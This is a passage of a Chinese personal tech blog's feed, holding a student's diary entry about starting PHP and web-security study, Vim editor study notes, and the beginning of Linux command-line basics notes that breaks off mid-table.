&amp;nbsp;//更新到远程服务器上 </div><div class="line"></div><div class="line">$ git rm //移除文件</div></pre></td></tr></table></figure></p>
<p>转自          <a href="http://www.cnblogs.com/lijiayi/p/githubpages.html" target="_blank" rel="external">如何在Github Pages搭建自己写的页面？</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[2016-09-29]]></title>
      <url>http://uknowsec.cn/posts/life/2016-09-29.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>离上次写博客也快二十天了，今天乘刚刚洗了头发没干写一篇博客总结和规划之前和之后的计划吧。</p>
<h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><p>最近这二十天一直在备战计算机二级，前几天考完二级才有时间来搞之前定下的计划Web开发。学校的研究院招新，就在招新的前一天上午我就和室友去研究院找了老师，具体是因为我跟学长说我想过去搞Web开发（PHP）。在研究院，老师也说了，只要我们能学学了能自己写一些网页。他是有项目的。然后还说了另外的许许。这也让我坚定了开始php学习和php项目的决心，我个人是偏向于web安全的方面的。但是在一次做ctf题目的时候，我才意识到我学好php的重要性。因此我才主动联系了学长，想一起搞个php的项目组。在宣讲填表的时候，我填了web开发和web安全。我希望能从php开发中深刻的学习php,为自己感兴趣的web安全打好基础。不久参加了一个简单的面试，这也是我第一次面试，并没有想象中的那么紧张，而后的分组，我和我两个室友和隔壁宿舍的哥们组成了web开发小组。由于学校研究院也是刚刚成立才一两年，院里没有搞php开发了，学长学姐偏软方向都是搞强类型语言的开发，这就意味着，我们这个小组没人带，我们需要自己白手起家。自己学，自己做。对于我并不感觉这个有多么的失望，反正做什么都是靠自己的。想混吃等死，混混日子并不是我想做的。至此我们组成了一个小的Team，我们都是小白，什么都不懂，什么都要自己学。在成立小组几天后，正在安全公司的一个学长给我发来了一个信息问我想什么时候实习，他们公司缺人，我开始是很惊讶的。我回复说：“大二暑假”。然后他也给我介绍了他们公司的实习待遇和环境氛围。我是很高兴，不管实习的待遇如何，这是一次很好的机会对于我，我可以跟牛逼的人一起学习，这是我很期待的。我很快的答应了他。他也鼓励我好好学技术，在这一年中。我也跟他说了我最近的情况。然后便一直在备战二级，前几天才考完，这几天一直在学习HTML的知识。对于我和我们这个小小的团队，一切从头开始，白手起家。脚踏实地地干。这个才是最重要的。马上也要放国庆假了，刚刚在小组里面讨论了我们国庆的学习任务，国庆自己的计划在这里简单的说下。先把自己的学科（学校的学科）作业完成，然后完成国庆的计划任务。进行下一步的Javascript,Mysql,PHP等一系列的学习，然后鉴于我手上还一本《XSS跨站脚本攻击剖析与防御》，学习学习下xxs的原理和利用吧。</p>
<h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02 结语"></a>0x02 结语</h2><p>就这样吧！头发也干了！简单的写一篇博客。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Vim编辑器-学习笔记]]></title>
      <url>http://uknowsec.cn/posts/notes/Vim%E7%BC%96%E8%BE%91%E5%99%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="vim快速入门"><a href="#vim快速入门" class="headerlink" title="vim快速入门"></a>vim快速入门</h1><h2 id="vim模式介绍"><a href="#vim模式介绍" class="headerlink" title="vim模式介绍"></a>vim模式介绍</h2><p>以下介绍内容来自维基百科<a href="http://zh.wikipedia.org/wiki/Vim" target="_blank" rel="external">Vim</a></p>
<p>从vi演生出来的Vim具有多种模式，这种独特的设计容易使初学者产生混淆。几乎所有的编辑器都会有插入和执行命令两种模式，并且大多数的编辑器使用了与Vim截然不同的方式：命令目录（鼠标或者键盘驱动），组合键（通常通过control键（CTRL）和alt键（ALT）组成）或者鼠标输入。Vim和vi一样，仅仅通过键盘来在这些模式之中切换。这就使得Vim可以不用进行菜单或者鼠标操作，并且最小化组合键的操作。对文字录入员或者程序员可以大大增强速度和效率。</p>
<p>Vim具有6种基本模式和5种派生模式，我们这里只简单介绍下6种基本模式：</p>
<ul>
<li><p>普通模式(Normal mode)</p>
<blockquote>
<p>在普通模式中，用的编辑器命令，比如移动光标，删除文本等等。这也是Vim启动后的默认模式。这正好和许多新用户期待的操作方式相反（大多数编辑器默认模式为插入模式）。</p>
<p>Vim强大的编辑能来自于其普通模式命令。普通模式命令往往需要一个操作符结尾。例如普通模式命令<code>dd</code>删除当前行，但是第一个”d”的后面可以跟另外的移动命令来代替第二个<code>d</code>，比如用移动到下一行的”j”键就可以删除当前行和下一行。另外还可以指定命令重复次数，<code>2dd</code>（重复<code>dd</code>两次），和<code>dj</code>的效果是一样的。用户学习了各种各样的文本间移动／跳转的命令和其他的普通模式的编辑命令，并且能够灵活组合使用的话，能够比那些没有模式的编辑器更加高效的进行文本编辑。</p>
<p>在普通模式中，有很多方法可以进入插入模式。比较普通的方式是按<code>a</code>（append／追加）键或者<code>i</code>（insert／插入）键。</p>
</blockquote>
</li>
<li><p>插入模式(Insert mode)</p>
<blockquote>
<p>在这个模式中，大多数按键都会向文本缓冲中插入文本。大多数新用户希望文本编辑器编辑过程中一直保持这个模式。</p>
<p>在插入模式中，可以按<code>ESC</code>键回到普通模式。</p>
</blockquote>
</li>
<li><p>可视模式(Visual mode)</p>
<blockquote>
<p>这个模式与普通模式比较相似。但是移动命令会扩大高亮的文本区域。高亮区域可以是字符、行或者是一块文本。当执行一个非移动命令时，命令会被执行到这块高亮的区域上。Vim的”文本对象”也能和移动命令一样用在这个模式中。</p>
</blockquote>
</li>
<li><p>选择模式(Select mode)</p>
<blockquote>
<p>这个模式和无模式编辑器的行为比较相似（Windows标准文本控件的方式）。这个模式中，可以用鼠标或者光标键高亮选择文本，不过输入任何字符的话，Vim会用这个字符替换选择的高亮文本块，并且自动进入插入模式。</p>
</blockquote>
</li>
<li><p>命令行模式(Command line mode)</p>
<blockquote>
<p>在命令行模式中可以输入会被解释成并执行的文本。例如执行命令（<code>:</code>键），搜索（<code>/</code>和<code>?</code>键）或者过滤命令（<code>!</code>键）。在命令执行之后，Vim返回到命令行模式之前的模式，通常是普通模式。</p>
</blockquote>
</li>
<li><p>Ex模式(Ex mode)</p>
<blockquote>
<p>这和命令行模式比较相似，在使用<code>:visual</code>命令离开Ex模式前，可以一次执行多条命令。</p>
<p>这其中我们常用到就是普通模式、插入模式和命令行模式，本课程也只涉及这三个常用模式的内容</p>
</blockquote>
</li>
</ul>
<h2 id="三种常见模式的切换"><a href="#三种常见模式的切换" class="headerlink" title="三种常见模式的切换"></a>三种常见模式的切换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Esc 或者 Ctrl+[    #进入普通模式</div><div class="line">i（插入）或a(附加) #进入插入模式</div><div class="line">：                 #进入命令行模式</div><div class="line">wq                 #保存并退出vim</div></pre></td></tr></table></figure>
<p><img src="https://dn-anything-about-doc.qbox.me/md041716vim.gif" alt=""></p>
<h2 id="进入vim"><a href="#进入vim" class="headerlink" title="进入vim"></a>进入vim</h2><h3 id="使用vim命令进入vim界面"><a href="#使用vim命令进入vim界面" class="headerlink" title="使用vim命令进入vim界面"></a>使用vim命令进入vim界面</h3><p>vim后面加上你要打开的已存在的文件名或者不存在（则作为新建文件）的文件名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ vim practice_1.txt</div></pre></td></tr></table></figure></p>
<p>直接使用vim<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ vim</div></pre></td></tr></table></figure></p>
<p>进入命令行模式输入<code>:e 文件路径</code>打开相应文件</p>
<h3 id="游标移动"><a href="#游标移动" class="headerlink" title="游标移动"></a>游标移动</h3><p>按<code>Esc</code>进入普通模式，在该模式下使用方向键或者<code>h</code>,<code>j</code>,<code>k</code>,<code>l</code>键可以移动游标。</p>
<table>
<thead>
<tr>
<th>按键</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>h</td>
<td style="text-align:left">左</td>
</tr>
<tr>
<td>l</td>
<td style="text-align:left">右（小写L）</td>
</tr>
<tr>
<td>j</td>
<td style="text-align:left">下</td>
</tr>
<tr>
<td>k</td>
<td style="text-align:left">上</td>
</tr>
<tr>
<td>w</td>
<td style="text-align:left">移动到下一个单词</td>
</tr>
<tr>
<td>b</td>
<td style="text-align:left">移动到上一个单词</td>
</tr>
</tbody>
</table>
<h2 id="进入插入模式"><a href="#进入插入模式" class="headerlink" title="进入插入模式"></a>进入插入模式</h2><h3 id="进入插入模式-1"><a href="#进入插入模式-1" class="headerlink" title="进入插入模式"></a>进入插入模式</h3><p><code>i</code> 进入插入模式</p>
<table>
<thead>
<tr>
<th>按键</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>i</td>
<td style="text-align:left">在当前光标处进行编辑</td>
</tr>
<tr>
<td>I</td>
<td style="text-align:left">在行首插入</td>
</tr>
<tr>
<td>A</td>
<td style="text-align:left">在行末插入</td>
</tr>
<tr>
<td>a</td>
<td style="text-align:left">在光标后插入编辑</td>
</tr>
<tr>
<td>o</td>
<td style="text-align:left">在当前行后插入一个新行</td>
</tr>
<tr>
<td>O</td>
<td style="text-align:left">在当前行前插入一个新行</td>
</tr>
<tr>
<td>cw</td>
<td style="text-align:left">替换从光标所在位置后到一个单词结尾的字符</td>
</tr>
</tbody>
</table>
<h2 id="保存文档"><a href="#保存文档" class="headerlink" title="保存文档"></a>保存文档</h2><h3 id="命令行模式下保存文档"><a href="#命令行模式下保存文档" class="headerlink" title="命令行模式下保存文档"></a>命令行模式下保存文档</h3><p><code>:</code>进入命令行模式，输入<code>w</code>回车，保存文档。输入<code>:w 文件名</code>可以将文档另存为其他文件名或存到其他路径下</p>
<h2 id="退出vim"><a href="#退出vim" class="headerlink" title="退出vim"></a>退出vim</h2><h3 id="命令行模式下退出vim"><a href="#命令行模式下退出vim" class="headerlink" title="命令行模式下退出vim"></a>命令行模式下退出vim</h3><p>从普通模式输入<code>：</code>进入命令行模式，输入`wq’回车，保存并退出编辑</p>
<p>以下为其他几种退出方法</p>
<table>
<thead>
<tr>
<th>命令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>:q!</td>
<td style="text-align:left">强制退出，不保存</td>
</tr>
<tr>
<td>:q</td>
<td style="text-align:left">退出</td>
</tr>
<tr>
<td>:qw!</td>
<td style="text-align:left">强制保存并退出</td>
</tr>
<tr>
<td>:w &lt;文件路径&gt;</td>
<td style="text-align:left">另存为</td>
</tr>
<tr>
<td>:saveas 文件路径</td>
<td style="text-align:left">另存为</td>
</tr>
<tr>
<td>:x</td>
<td style="text-align:left">保存并退出</td>
</tr>
<tr>
<td>:wq</td>
<td style="text-align:left">保存并退出</td>
</tr>
</tbody>
</table>
<h3 id="普通模式下退出vim"><a href="#普通模式下退出vim" class="headerlink" title="普通模式下退出vim"></a>普通模式下退出vim</h3><p><code>Shift+zz</code>即可保存退出vim</p>
<h2 id="删除文本"><a href="#删除文本" class="headerlink" title="删除文本"></a>删除文本</h2><h3 id="普通模式下删除vim文本信息"><a href="#普通模式下删除vim文本信息" class="headerlink" title="普通模式下删除vim文本信息"></a>普通模式下删除vim文本信息</h3><p>进入普通模式，使用下列命令可以进行文本快速删除：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>x</td>
<td style="text-align:left">删除游标所在的字符</td>
</tr>
<tr>
<td>X</td>
<td style="text-align:left">删除游标所在前一个字符</td>
</tr>
<tr>
<td>Delete</td>
<td style="text-align:left">同x</td>
</tr>
<tr>
<td>dd</td>
<td style="text-align:left">删除整行</td>
</tr>
<tr>
<td>dw</td>
<td style="text-align:left">删除一个单词（不适用中文）</td>
</tr>
<tr>
<td>d$或D</td>
<td style="text-align:left">删除至行尾</td>
</tr>
<tr>
<td>d^</td>
<td style="text-align:left">删除至行首</td>
</tr>
<tr>
<td>dG</td>
<td style="text-align:left">删除到文档结尾处</td>
</tr>
<tr>
<td>d1G</td>
<td style="text-align:left">删至文档首部</td>
</tr>
</tbody>
</table>
<p>在命令之前加上数字，表示一次删除多行<br><code>2dd</code>表示一次删除2行</p>
<h1 id="Vim文档编辑"><a href="#Vim文档编辑" class="headerlink" title="Vim文档编辑"></a>Vim文档编辑</h1><h2 id="vim重复命令"><a href="#vim重复命令" class="headerlink" title="vim重复命令"></a>vim重复命令</h2><h3 id="重复执行上次命令"><a href="#重复执行上次命令" class="headerlink" title="重复执行上次命令"></a>重复执行上次命令</h3><p>在普通模式下<code>.</code>（小数点）表示重复上次的命令操作</p>
<h3 id="执行指定次数相同的命令"><a href="#执行指定次数相同的命令" class="headerlink" title="执行指定次数相同的命令"></a>执行指定次数相同的命令</h3><p>普通模式输入<code>N&lt;command&gt;</code>,N表示重复后面的次数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">10x  #删除10个连续字符</div><div class="line">3dd  #删除3行文本</div><div class="line">dw   #删除一个单词</div><div class="line">dnw  #删除n个单词</div></pre></td></tr></table></figure>
<h2 id="游标的快速跳转"><a href="#游标的快速跳转" class="headerlink" title="游标的快速跳转"></a>游标的快速跳转</h2><h3 id="行间跳转"><a href="#行间跳转" class="headerlink" title="行间跳转"></a>行间跳转</h3><table>
<thead>
<tr>
<th>命令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>nG(n Shift+g)</td>
<td style="text-align:left">游标移动到第 n 行(如果默认没有显示行号，请先进入命令模式，输入:set nu以显示行号)</td>
</tr>
<tr>
<td>gg</td>
<td style="text-align:left">删除游标所在前一个字符</td>
</tr>
<tr>
<td>G(Shift+g)</td>
<td style="text-align:left">到最后一行</td>
</tr>
</tbody>
</table>
<p>使用Ctrl+o快速回到上一次(跳转前)光标所在位置</p>
<h3 id="行内跳转"><a href="#行内跳转" class="headerlink" title="行内跳转"></a>行内跳转</h3><table>
<thead>
<tr>
<th>命令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>w</td>
<td style="text-align:left">到下一个单词的开头</td>
</tr>
<tr>
<td>e</td>
<td style="text-align:left">到下一个单词的结尾</td>
</tr>
<tr>
<td>b</td>
<td style="text-align:left">到前一个单词的开头</td>
</tr>
<tr>
<td>ge</td>
<td style="text-align:left">到前一个单词的结尾</td>
</tr>
<tr>
<td>0或^</td>
<td style="text-align:left">到行头</td>
</tr>
<tr>
<td>$</td>
<td style="text-align:left">到行尾</td>
</tr>
<tr>
<td>f&lt;字母&gt;</td>
<td style="text-align:left">向后搜索&lt;字母&gt;并跳转到第一个匹配的位置(非常实用)</td>
</tr>
<tr>
<td>F&lt;字母&gt;</td>
<td style="text-align:left">向前搜索&lt;字母&gt;并跳转到第一个匹配的位置</td>
</tr>
<tr>
<td>t&lt;字母&gt;</td>
<td style="text-align:left">向后搜索&lt;字母&gt;并跳转到第一个匹配位置之前的一个字母(不常用)</td>
</tr>
<tr>
<td>T&lt;字母&gt;</td>
<td style="text-align:left">向前搜索&lt;字母&gt;并跳转到第一个匹配位置之后的一个字母(不常用)</td>
</tr>
</tbody>
</table>
<h2 id="复制粘贴和剪切"><a href="#复制粘贴和剪切" class="headerlink" title="复制粘贴和剪切"></a>复制粘贴和剪切</h2><h3 id="复制及粘贴文本"><a href="#复制及粘贴文本" class="headerlink" title="复制及粘贴文本"></a>复制及粘贴文本</h3><p>普通模式中使用<code>y</code>复制</p>
<ul>
<li>普通模式中，<code>yy</code>复制游标所在的整行（<code>3yy</code>表示复制3行）</li>
<li>普通模式中，<code>y^</code> 复制至行首，或<code>y0</code>。不含光标所在处字符。</li>
<li>普通模式中，<code>y$</code> 复制至行尾。含光所在处字符。</li>
<li>普通模式中，<code>yw</code> 复制一个单词。</li>
<li>普通模式中，<code>y2w</code> 复制两个单词。</li>
<li>普通模式中，<code>yG</code> 复制至文本末。</li>
<li>普通模式中，<code>y1G</code> 复制至文本开头。</li>
</ul>
<p>普通模式中使用<code>p</code>粘贴</p>
<ul>
<li>普通模式中，<code>p</code>(小写)代表粘贴至光标后（下）</li>
<li>普通模式中，<code>P</code>(大写)代表粘贴至光标前（上）</li>
</ul>
<h3 id="剪切及粘贴"><a href="#剪切及粘贴" class="headerlink" title="剪切及粘贴"></a>剪切及粘贴</h3><p><code>dd</code>剪切，每次<code>dd</code>后可以用<code>p</code>粘贴</p>
<h1 id="查找替换"><a href="#查找替换" class="headerlink" title="查找替换"></a>查找替换</h1><h2 id="字符的替换及撤销（Undo操作）"><a href="#字符的替换及撤销（Undo操作）" class="headerlink" title="字符的替换及撤销（Undo操作）"></a>字符的替换及撤销（Undo操作）</h2><h3 id="替换和撤销（Undo-命令"><a href="#替换和撤销（Undo-命令" class="headerlink" title="替换和撤销（Undo)命令"></a>替换和撤销（Undo)命令</h3><p>替换和Undo命令都是针对普通模式下的操作</p>
<table>
<thead>
<tr>
<th>命令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>r+&lt;待替换字母&gt;</td>
<td style="text-align:left">将游标所在字母替换为指定字母</td>
</tr>
<tr>
<td>R</td>
<td style="text-align:left">连续替换，直到按下Esc</td>
</tr>
<tr>
<td>cc</td>
<td style="text-align:left">替换整行，即删除游标所在行，并进入插入模式</td>
</tr>
<tr>
<td>cw</td>
<td style="text-align:left">替换一个单词，即删除一个单词，并进入插入模式</td>
</tr>
<tr>
<td>C(大写)</td>
<td style="text-align:left">替换游标以后至行末</td>
</tr>
<tr>
<td>~</td>
<td style="text-align:left">反转游标所在字母大小写</td>
</tr>
<tr>
<td>u{n}</td>
<td style="text-align:left">撤销一次或n次操作</td>
</tr>
<tr>
<td>U(大写)</td>
<td style="text-align:left">撤销当前行的所有修改</td>
</tr>
<tr>
<td>Ctrl+r</td>
<td style="text-align:left">redo，即撤销undo的操作</td>
</tr>
</tbody>
</table>
<h2 id="快速缩进"><a href="#快速缩进" class="headerlink" title="快速缩进"></a>快速缩进</h2><h3 id="使用命令进行快速调整缩进操作"><a href="#使用命令进行快速调整缩进操作" class="headerlink" title="使用命令进行快速调整缩进操作"></a>使用命令进行快速调整缩进操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;    #整行将向缩进</div><div class="line">&lt;&lt;    #整行向左回退</div></pre></td></tr></table></figure>
<h3 id="shiftwidth命令"><a href="#shiftwidth命令" class="headerlink" title="shiftwidth命令"></a>shiftwidth命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">:set shiftwidth?     #获取目前的缩进字符值</div><div class="line">:set shiftwidth=10   #设置缩进字符值为10</div></pre></td></tr></table></figure>
<h3 id="调整文本位置"><a href="#调整文本位置" class="headerlink" title="调整文本位置"></a>调整文本位置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">:re		#居中   </div><div class="line">:ri		#靠右</div><div class="line">:le		#靠左</div></pre></td></tr></table></figure>
<h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><h3 id="快速查找"><a href="#快速查找" class="headerlink" title="快速查找"></a>快速查找</h3><p>普通模式下输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">/www		#向下查找www</div><div class="line">?www 		#向上查找www</div><div class="line">n   		#进入查找后，n正向查找</div><div class="line">N   		#进入查找后，N反向查找</div></pre></td></tr></table></figure>
<h3 id="高级查找"><a href="#高级查找" class="headerlink" title="高级查找"></a>高级查找</h3><ul>
<li>普通模式下输入<code>\*</code>寻找游标所在处的单词</li>
<li>普通模式下输入<code>\#</code>同上，但 <code>\*</code> 是向前（上）找，#则是向后（下）找</li>
<li>普通模式下输入<code>g\*</code>同<code>\*</code> ，但部分符合该单词即可</li>
<li>普通模式下输入<code>g\#</code>同<code>\#</code> ，但部分符合该单词即可</li>
</ul>
<h1 id="高级功能入门"><a href="#高级功能入门" class="headerlink" title="高级功能入门"></a>高级功能入门</h1><h2 id="多文件编辑"><a href="#多文件编辑" class="headerlink" title="多文件编辑"></a>多文件编辑</h2><h3 id="使用vim编辑多个文件"><a href="#使用vim编辑多个文件" class="headerlink" title="使用vim编辑多个文件"></a>使用vim编辑多个文件</h3><p>同时创建两个新文件并编辑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ vim 1.txt 2.txt</div></pre></td></tr></table></figure></p>
<p>默认进入1.txt文件的编辑界面</p>
<ul>
<li>命令行模式下输入:n编辑2.txt文件，可以加!即:n!强制切换，之前一个文件的输入没有保存，仅仅切换到另一个文件</li>
<li>命令行模式下输入:N编辑1.txt文件，可以加!即:N!强制切换，之前文件内的输入没有保存，仅仅是切换到另一个文件</li>
</ul>
<h3 id="进入vim后打开新文件"><a href="#进入vim后打开新文件" class="headerlink" title="进入vim后打开新文件"></a>进入vim后打开新文件</h3><ul>
<li>命令行模式下输入<code>:e 3.txt</code> 打开新文件3.txt</li>
<li>命令行模式下输入<code>:e#</code> 回到前一个文件</li>
<li>命令行模式下输入<code>:ls</code>可以列出以前编辑过的文档</li>
<li>命令行模式下输入<code>:b 2.txt</code>（或者编号）可以直接进入文件2.txt编辑</li>
<li>命令行模式下输入<code>:bd 2.txt</code>（或者编号）可以删除以前编辑过的列表中的文件项目</li>
<li>命令行模式下输入<code>:e! 4.txt</code>，新打开文件4.txt，放弃正在编辑的文件</li>
<li>命令行模式下输入<code>:f</code> 显示正在编辑的文件名</li>
<li>命令行模式下输入<code>:f new.txt</code>，改变正在编辑的文件名字为new.txt</li>
</ul>
<h3 id="恢复文件"><a href="#恢复文件" class="headerlink" title="恢复文件"></a>恢复文件</h3><p>如果因为断电等原因造成文档没有保存，可以采用恢复方式，<code>vim -r</code>进入文档后，输入<code>:ewcover 1.txt</code>来恢复<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ vim -r 1.txt</div></pre></td></tr></table></figure></p>
<h2 id="可视模式"><a href="#可视模式" class="headerlink" title="可视模式"></a>可视模式</h2><h3 id="可视模式命令简介"><a href="#可视模式命令简介" class="headerlink" title="可视模式命令简介"></a>可视模式命令简介</h3><ul>
<li>在普通模式下输入<code>v</code>（小写），进入字符选择模式，就可以移动光标，光标走过的地方就会选取。再次按下v会后就会取消选取。</li>
<li>在普通模式下输入<code>Shift+v</code>（小写），进入行选择模式，按下V之后就会把整行选取，您可以上下移动光标选更多的行，同样，再按一次<code>Shift+v</code>就可以取消选取。</li>
<li>在普通模式下输入 <code>Ctrl+v</code>（小写），这是区域选择模式，可以进行矩形区域选择，再按一次<code>Ctrl+v</code>取消选取。</li>
<li>在普通模式下输入<code>d</code>删除选取区域内容</li>
<li>在普通模式下输入<code>y</code>复制选取区域内容</li>
</ul>
<h2 id="视窗操作"><a href="#视窗操作" class="headerlink" title="视窗操作"></a>视窗操作</h2><h3 id="视窗操作简介"><a href="#视窗操作简介" class="headerlink" title="视窗操作简介"></a>视窗操作简介</h3><p>vim可以在一个界面里打开多个窗口进行编辑，这些编辑窗口称为vim的视窗。<br>打开方法有很多种，例如可以使用在命令行模式下输入<code>:new</code> 打开一个新的vim视窗，并进入视窗编辑一个新文件（普通模式下输入<code>Ctrl+w</code>也可以,但是<code>Ctrl+w</code>在chrome下会与chrome关闭标签页的快捷键冲突，所以使用该快捷键你可以在IE或其它浏览器进行练习），除了<code>:new</code>命令，下述列举的多种方法也可以在命令模式或普通模式下打开新的视窗：</p>
<ul>
<li>命令行模式下输入<code>:sp 1.txt</code> 打开新的横向视窗来编辑1.txt</li>
<li>命令行模式下输入<code>:vsp 2.txt</code> 打开新的纵向视窗来编辑1.txt</li>
<li>普通模式下<code>Ctrl-w s</code> 将当前窗口分割成两个水平的窗口</li>
<li>普通模式下<code>Ctrl-w v</code> 将当前窗口分割成两个垂直的窗口</li>
<li>普通模式下<code>Ctrl-w q</code>  即 :q 结束分割出来的视窗。如果在新视窗中有输入需要使用强制符！即:q!</li>
<li>普通模式下<code>Ctrl-w o</code> 打开一个视窗并且隐藏之前的所有视窗</li>
<li>普通模式下<code>Ctrl-w j</code> 移至下面视窗</li>
<li>普通模式下<code>Ctrl-w k</code> 移至上面视窗</li>
<li>普通模式下<code>Ctrl-w h</code> 移至左边视窗</li>
<li>普通模式下<code>Ctrl-w l</code> 移至右边视窗</li>
<li>普通模式下<code>Ctrl-w J</code> 将当前视窗移至下面</li>
<li>普通模式下<code>Ctrl-w K</code> 将当前视窗移至上面</li>
<li>普通模式下<code>Ctrl-w H</code> 将当前视窗移至左边</li>
<li>普通模式下<code>Ctrl-w L</code> 将当前视窗移至右边</li>
<li>普通模式下<code>Ctrl-w -</code> 减小视窗的高度</li>
<li>普通模式下<code>Ctrl-w +</code> 增加视窗的高度</li>
</ul>
<h2 id="文档加密"><a href="#文档加密" class="headerlink" title="文档加密"></a>文档加密</h2><h3 id="创建加密文档"><a href="#创建加密文档" class="headerlink" title="创建加密文档"></a>创建加密文档</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ vim -x file1</div></pre></td></tr></table></figure>
<h2 id="在vim执行外部命令"><a href="#在vim执行外部命令" class="headerlink" title="在vim执行外部命令"></a>在vim执行外部命令</h2><h2 id="在vim执行外部命令-1"><a href="#在vim执行外部命令-1" class="headerlink" title="在vim执行外部命令"></a>在vim执行外部命令</h2><p>在命令行模式中输入<code>!</code>可以执行外部的shell命令</p>
<ul>
<li><code>:!ls</code>  用于显示当前目录的内容</li>
<li><code>:!rm FILENAME</code>用于删除名为 FILENAME 的文件</li>
<li><code>:w FILENAME</code>可将当前 VIM 中正在编辑的文件另存为 FILENAME 文件</li>
</ul>
<h2 id="帮助系统"><a href="#帮助系统" class="headerlink" title="帮助系统"></a>帮助系统</h2><h3 id="vim中的查看帮助"><a href="#vim中的查看帮助" class="headerlink" title="vim中的查看帮助"></a>vim中的查看帮助</h3><ul>
<li>普通模式下按<code>F1</code>打开<code>vim</code>自己预设的帮助文档</li>
<li>命令行模式下输入<code>:h shiftwidth</code> 打开名为<code>shiftwidth</code>的帮助文件</li>
<li>命令行模式下输入<code>:ver</code> 显示版本及参数</li>
</ul>
<h2 id="功能设定"><a href="#功能设定" class="headerlink" title="功能设定"></a>功能设定</h2><h3 id="vim的功能设定"><a href="#vim的功能设定" class="headerlink" title="vim的功能设定"></a>vim的功能设定</h3><p>可以在编辑文件的时候进行功能设定，如命令行模式下输入<code>:set nu</code>（显示行数），设定值退出vim后不会保存。要永久保存配置需要修改vim配置文件。<br>vim的配置文件<code>~/.vimrc</code>，可以打开文件进行修改，不过务必小心不要影响vim正常使用</p>
<h3 id="获取目前的设定"><a href="#获取目前的设定" class="headerlink" title="获取目前的设定"></a>获取目前的设定</h3><ul>
<li>命令行模式下输入<code>:set</code>或者<code>:se</code>显示所有修改过的配置</li>
<li>命令行模式下输入<code>:set all</code> 显示所有的设定值</li>
<li>命令行模式下输入<code>:set option?</code> 显示option的设定值</li>
<li>命令行模式下输入<code>:set nooption</code> 取消当期设定值</li>
</ul>
<h3 id="set功能的说明"><a href="#set功能的说明" class="headerlink" title="set功能的说明"></a>set功能的说明</h3><ul>
<li>命令行模式下输入<code>:set autoindent(ai)</code> 设置自动缩进</li>
<li>命令行模式下输入<code>:set autowrite(aw)</code> 设置自动存档，默认未打开</li>
<li>命令行模式下输入<code>:set background=dark</code>或<code>light</code>，设置背景风格</li>
<li>命令行模式下输入<code>:set backup(bk)</code> 设置自动备份，默认未打开</li>
<li>命令行模式下输入<code>: set cindent(cin)</code> 设置C语言风格缩进</li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Linux基础入门笔记]]></title>
      <url>http://uknowsec.cn/posts/notes/Linux%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="基本概念及操作"><a href="#基本概念及操作" class="headerlink" title="基本概念及操作"></a>基本概念及操作</h1><h2 id="一些常用快捷键"><a href="#一些常用快捷键" class="headerlink" title="一些常用快捷键"></a>一些常用快捷键</h2><table>
<thead>
<tr>
<th>按键</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ctrl+d</td>
<td style="text-align:left">键盘输入结束或退出终端</td>
</tr>
<tr>
<td>Ctrl+s</td>
<td style="text-align:left">暂定当前程序，暂停后按下任意键恢复运行</td>
</tr>
<tr>
<td>Ctrl+z</td>
<td style="text-align:left">将当前程序放到后台运行，恢复到前台为命令fg</td>
</tr>
<tr>
<td>Ctrl+a</td>
<td style="text-align:left">将光标移至输入行头，相当于Home键</td>
</tr>
<tr>
<td>Ctrl+e</td>
<td style="text-align:left">将光标移至输入行末，相当于End键</td>
</tr>
<tr>
<td>Ctrl+k</td>
<td style="text-align:left">删除从光标所在位置到行末</td>
</tr>
<tr>
<td>Alt+Backspace</td>
